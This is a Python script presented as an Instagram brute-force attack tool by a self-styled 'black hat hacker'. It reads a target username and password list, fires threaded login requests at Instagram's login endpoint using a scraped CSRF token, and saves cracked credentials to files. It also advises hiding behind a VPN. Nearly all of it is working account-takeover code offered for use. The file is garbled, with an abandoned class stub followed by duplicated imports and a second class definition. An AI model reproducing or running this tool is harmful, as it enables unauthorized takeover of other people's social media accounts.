# author : akash black hat hacke
# darkweb pleyer 127.0.0.1
from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input

CheckVersion = str(sys.version)
import re
from datetime import datetime

print('''    
\033[32m██╗███╗   ██╗███████╗████████╗ █████╗                     
██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗                    
██║██╔██╗ ██║███████╗   ██║   ███████║                    
██║██║╚██╗██║╚════██║   ██║   ██╔══██║                    
██║██║ ╚████║███████║   ██║   ██║  ██║                    
╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
┌┐ ┬─┐┬ ┬┌┬┐  ┌─┐┌─┐┬─┐┌─┐┌─┐   V1.0
├┴┐├┬┘│ │ │   ├┤ │ │├┬┘│  ├┤   
└─┘┴└─└─┘ ┴   └  └─┘┴└─└─┘└─┘     
\033[38m***\033[31mInstgrame Brute Force Attack \033[38m***
\033[33m*\033[32mDeveloper:AKASH BLACK HAT   \033[33m     *
\033[35m*\033[32mInstagram:akashblackhat    \033[35m      *
\033[31m*\033[32mYouTube  :Technical akash skills \033[31m*
\033[37m*\033[32mPassList :Attack\033[37m                 *
\033[35m**********\033[31m*********\033[33m*********\033[32m*******''')
print('''\033[31mNotice :-> Management depends on vpn software
Please use it before running the tool.\033[32m.''')
class InstaBrute(object):
    def __init__(self):

       import os
import re
import sys
import threading
import time
from datetime import datetime
import requests


class InstaBrute:
    """A class for brute-forcing Instagram accounts."""

    def __init__(self):
        """Initialize the class and start the brute-force attack."""

        try:
            username = input('username: ')
            password_list = input('passList: ')
            print('----------------------------')
        except KeyboardInterrupt:
            print('\nExiting the program.')
            sys.exit(1)

        with open(password_list, 'r') as file:
            password_list = file.read().splitlines()

        threads = []
        self.proxy_count = 0

        for password in password_list:
            t = threading.Thread(target=self.new_brute, args=(username, password))
            t.start()
            threads.append(t)
            time.sleep(0.9)

        for thread in threads:
            thread.join()

    def new_brute(self, username, password):
        """Attempt to log in to an Instagram account using the given username and password."""

        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        timestamp = int(datetime.now().timestamp())

        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as session:
            response = session.get(link)
            csrf_token = re.findall(r"csrf_token\":\"(.*?)\"", response.text)[0]
            response = session.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf_token
            })

            if 'authenticated": true' in response.text:
                print(f'{username}:{password} --> Good hack')
                with open('good.txt', 'a') as file:
                    file.write(f'{username}:{password}\n')
            elif 'two_factor_required' in response.text:
                print(f'{username}:{password} -->  Good It has to be checked')
                with open('results_NeedVerfiy.txt', 'a') as file:
                    file.write(f'{username}:{password}\n')

    @staticmethod
    def clear_screen():
        """Clear the console screen."""

        os.system('cls' if os.name == 'nt' else 'clear')



InstaBrute()
